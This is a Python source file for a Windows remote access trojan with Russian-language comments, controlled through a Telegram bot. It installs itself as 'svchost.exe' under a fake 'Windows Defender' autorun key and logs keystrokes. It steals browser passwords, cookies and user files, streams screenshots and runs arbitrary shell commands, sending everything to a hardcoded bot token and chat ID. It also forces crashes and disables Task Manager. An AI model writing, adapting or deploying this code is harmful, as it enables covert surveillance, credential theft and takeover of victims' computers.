import os
import sys
import shutil
import winreg
import socket
import threading
import subprocess
import sqlite3
import json
import base64
import requests
import ctypes
import time
import random
from Crypto.Cipher import AES
from pynput import keyboard, mouse
from PIL import ImageGrab
import telebot
from flask import Flask, render_template_string, request, Response
import io
import screen_brightness_control as sbc
import pyautogui

# ================== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ==================
BOT_TOKEN = "7871203662:AAFXxBNfOEjIGQ4K4DD9-aCZvIbBoRXUmCk"
CHAT_ID = "1342423877"
VIRUS_NAME = "svchost.exe"
HIDDEN_PATH = os.path.join(os.environ['APPDATA'], VIRUS_NAME)
KEYLOG_FILE = os.path.join(os.environ['APPDATA'], "keylog.txt")
COOKIES_FILE = os.path.join(os.environ['APPDATA'], "cookies.txt")
# ==================================================

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–Ω–µ—à–Ω–µ–≥–æ IP
def get_external_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–≥–æ IP
def get_internal_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP"

# –û—Ç–ø—Ä–∞–≤–∫–∞ IP –≤ Telegram –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
def send_ip_to_telegram():
    external_ip = get_external_ip()
    internal_ip = get_internal_ip()
    hostname = socket.gethostname()
    username = os.getlogin()
    
    message = f"üéØ –ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê –ü–û–î–ö–õ–Æ–ß–ï–ù–ê!\n\n" \
              f"üñ•Ô∏è –•–æ—Å—Ç–Ω–µ–π–º: {hostname}\n" \
              f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}\n" \
              f"üåê –í–Ω–µ—à–Ω–∏–π IP: {external_ip}\n" \
              f"üîß –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP: {internal_ip}\n\n" \
              f"üíª –ò—Å–ø–æ–ª—å–∑—É–π –∫–æ–º–∞–Ω–¥—ã –≤ Telegram –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è"
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={"chat_id": CHAT_ID, "text": message})
    except:
        pass

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏ —Å–∫—Ä—ã—Ç–∏–µ
def install():
    if not os.path.exists(HIDDEN_PATH):
        shutil.copyfile(sys.argv[0], HIDDEN_PATH)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Windows Defender", 0, winreg.REG_SZ, HIDDEN_PATH)
        winreg.CloseKey(key)

# ================== –ü–†–ê–ù–ö–ò ==================
def open_many_windows():
    for i in range(50):
        try:
            subprocess.Popen(['notepad.exe'])
            subprocess.Popen(['calc.exe'])
        except:
            pass

def fake_blue_screen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        os.system("shutdown /r /t 0")

def mouse_prank():
    def move_mouse():
        while True:
            x = random.randint(0, 1920)
            y = random.randint(0, 1080)
            pyautogui.moveTo(x, y, duration=0.5)
            time.sleep(3)
    threading.Thread(target=move_mouse, daemon=True).start()

def screen_flip():
    try:
        ctypes.windll.user32.SetDisplayConfig(0, 0, 0, 0, 0x00000080)
    except:
        pass

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def win_locker():
    def lock_screen():
        time.sleep(10)
        ctypes.windll.user32.LockWorkStation()
    threading.Thread(target=lock_screen, daemon=True).start()

# ================== –¢–†–ê–ù–°–õ–Ø–¶–ò–Ø –≠–ö–†–ê–ù–ê ==================
def screen_stream():
    while True:
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr = img_byte_arr.getvalue()
            
            # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –≤ Telegram
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                         data={"chat_id": CHAT_ID},
                         files={"photo": ("screen.png", img_byte_arr)})
            time.sleep(5)  # –°–∫—Ä–∏–Ω –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
        except:
            time.sleep(10)

# ================== –ö–†–ê–ñ–ê –í–°–ï–• –§–ê–ô–õ–û–í ==================
def steal_all_files():
    important_extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
                           '.jpg', '.jpeg', '.png', '.zip', '.rar', '.7z',
                           '.sql', '.db', '.config', '.ini', '.log']
    
    stolen_files = []
    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
        for file in files:
            if any(file.endswith(ext) for ext in important_extensions):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                    stolen_files.append((file, file_data))
                except:
                    pass
    return stolen_files

# –ö–µ–π–ª–æ–≥–≥–µ—Ä
def keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{key} ")
        except:
            pass
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# –ö—Ä–∞–∂–∞ –ø–∞—Ä–æ–ª–µ–π –±—Ä–∞—É–∑–µ—Ä–æ–≤
def steal_browser_passwords():
    browsers = {
        "Chrome": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Firefox": os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    }
    
    passwords = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pass_enc in cursor.fetchall():
                    passwords.append(f"{browser}|{url}|{user}|{pass_enc}")
            except:
                pass
    return passwords

# –ö—Ä–∞–∂–∞ cookies
def steal_cookies():
    browsers = {
        "Chrome": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies"),
        "Edge": os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
    }
    
    cookies = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            try:
                conn = sqlite3.connect(path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies")
                for host, name, value in cursor.fetchall():
                    cookies.append(f"{browser}|{host}|{name}|{value}")
            except:
                pass
    return cookies

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥
def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode("cp866", errors="ignore")
    except Exception as e:
        return str(e)

# Telegram –±–æ—Ç
def telegram_bot():
    bot = telebot.TeleBot(BOT_TOKEN)
    
    @bot.message_handler(commands=['start'])
    def start(message):
        external_ip = get_external_ip()
        internal_ip = get_internal_ip()
        bot.reply_to(message, f"‚úÖ RAT –∞–∫—Ç–∏–≤–µ–Ω –Ω–∞ {socket.gethostname()}\n"
                             f"üåê –í–Ω–µ—à–Ω–∏–π IP: {external_ip}\n"
                             f"üîß –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP: {internal_ip}\n\n"
                             f"üîß –ö–æ–º–∞–Ω–¥—ã:\n"
                             f"/cmd - –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É\n"
                             f"/keylog - –ü–æ–ª—É—á–∏—Ç—å –∫–µ–π–ª–æ–≥\n"
                             f"/passwords - –£–∫—Ä–∞—Å—Ç—å –ø–∞—Ä–æ–ª–∏\n"
                             f"/cookies - –£–∫—Ä–∞—Å—Ç—å cookies\n"
                             f"/screenshot - –°–∫—Ä–∏–Ω—à–æ—Ç\n"
                             f"/sysinfo - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ\n"
                             f"/stream_start - –ù–∞—á–∞—Ç—å —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é —ç–∫—Ä–∞–Ω–∞\n"
                             f"/stream_stop - –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—é\n"
                             f"/files - –£–∫—Ä–∞—Å—Ç—å –≤—Å–µ —Ñ–∞–π–ª—ã\n"
                             f"/prank_windows - –û—Ç–∫—Ä—ã—Ç—å –º–Ω–æ–≥–æ –æ–∫–æ–Ω\n"
                             f"/prank_bsod - –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏\n"
                             f"/prank_mouse - –î–≤–∏–≥–∞—Ç—å –º—ã—à–∫—É\n"
                             f"/prank_screen - –ü–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç—å —ç–∫—Ä–∞–Ω\n"
                             f"/prank_lock - –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å Windows\n"
                             f"/prank_disabletm - –û—Ç–∫–ª—é—á–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á")
    
    @bot.message_handler(commands=['cmd'])
    def cmd_handler(message):
        command = message.text.replace('/cmd ', '')
        result = execute_command(command)
        bot.reply_to(message, f"–ö–æ–º–∞–Ω–¥–∞: {command}\n–†–µ–∑—É–ª—å—Ç–∞—Ç:\n{result}")
    
    @bot.message_handler(commands=['keylog'])
    def keylog_handler(message):
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "–ö–µ–π–ª–æ–≥–≥–µ—Ä –ø—É—Å—Ç")
    
    @bot.message_handler(commands=['passwords'])
    def passwords_handler(message):
        passwords = steal_browser_passwords()
        if passwords:
            with open("passwords.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(passwords))
            with open("passwords.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
    
    @bot.message_handler(commands=['cookies'])
    def cookies_handler(message):
        cookies = steal_cookies()
        if cookies:
            with open("cookies.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(cookies))
            with open("cookies.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "Cookies –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
    
    @bot.message_handler(commands=['screenshot'])
    def screenshot_handler(message):
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        bot.send_photo(message.chat.id, img_byte_arr)
    
    @bot.message_handler(commands=['sysinfo'])
    def sysinfo_handler(message):
        external_ip = get_external_ip()
        internal_ip = get_internal_ip()
        info = f"""
üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞: {os.name}
üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {os.getlogin()}
üè† –•–æ—Å—Ç–Ω–µ–π–º: {socket.gethostname()}
üåê –í–Ω–µ—à–Ω–∏–π IP: {external_ip}
üîß –í–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π IP: {internal_ip}
        """
        bot.reply_to(message, info)
    
    @bot.message_handler(commands=['stream_start'])
    def stream_start_handler(message):
        global streaming
        streaming = True
        threading.Thread(target=screen_stream, daemon=True).start()
        bot.reply_to(message, "üé• –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —ç–∫—Ä–∞–Ω–∞ –∑–∞–ø—É—â–µ–Ω–∞! –°–∫—Ä–∏–Ω—à–æ—Ç—ã –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥")
    
    @bot.message_handler(commands=['stream_stop'])
    def stream_stop_handler(message):
        global streaming
        streaming = False
        bot.reply_to(message, "üé• –¢—Ä–∞–Ω—Å–ª—è—Ü–∏—è —ç–∫—Ä–∞–Ω–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
    
    @bot.message_handler(commands=['files'])
    def files_handler(message):
        bot.reply_to(message, "üìÅ –ù–∞—á–∏–Ω–∞—é –∫—Ä–∞–∂—É —Ñ–∞–π–ª–æ–≤...")
        stolen_files = steal_all_files()
        for file_name, file_data in stolen_files:
            try:
                bot.send_document(message.chat.id, (file_name, file_data))
            except:
                pass
        bot.reply_to(message, f"‚úÖ –£–∫—Ä–∞–¥–µ–Ω–æ —Ñ–∞–π–ª–æ–≤: {len(stolen_files)}")
    
    # –ü—Ä–∞–Ω–∫–∏
    @bot.message_handler(commands=['prank_windows'])
    def prank_windows_handler(message):
        threading.Thread(target=open_many_windows, daemon=True).start()
        bot.reply_to(message, "ü™ü –û—Ç–∫—Ä—ã–≤–∞—é 50+ –æ–∫–æ–Ω!")
    
    @bot.message_handler(commands=['prank_bsod'])
    def prank_bsod_handler(message):
        threading.Thread(target=fake_blue_screen, daemon=True).start()
        bot.reply_to(message, "üíÄ –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!")
    
    @bot.message_handler(commands=['prank_mouse'])
    def prank_mouse_handler(message):
        threading.Thread(target=mouse_prank, daemon=True).start()
        bot.reply_to(message, "üê≠ –ú—ã—à—å —Å–æ—à–ª–∞ —Å —É–º–∞!")
    
    @bot.message_handler(commands=['prank_screen'])
    def prank_screen_handler(message):
        threading.Thread(target=screen_flip, daemon=True).start()
        bot.reply_to(message, "üîÑ –≠–∫—Ä–∞–Ω –ø–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç!")
    
    @bot.message_handler(commands=['prank_lock'])
    def prank_lock_handler(message):
        threading.Thread(target=win_locker, daemon=True).start()
        bot.reply_to(message, "üîí Windows –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥!")
    
    @bot.message_handler(commands=['prank_disabletm'])
    def prank_disabletm_handler(message):
        disable_task_manager()
        bot.reply_to(message, "üö´ –î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á –æ—Ç–∫–ª—é—á–µ–Ω!")
    
    bot.polling(none_stop=True)

# –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
if __name__ == "__main__":
    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞
    install()
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ IP –≤ Telegram –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ
    send_ip_to_telegram()
    
    # –ó–∞–ø—É—Å–∫ –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –≤ —Ñ–æ–Ω–µ
    keylog_thread = threading.Thread(target=keylogger, daemon=True)
    keylog_thread.start()
    
    # –ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞ –≤ —Ñ–æ–Ω–µ
    tg_thread = threading.Thread(target=telegram_bot, daemon=True)
    tg_thread.start()
    
    # –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª
    while True:
        time.sleep(3600)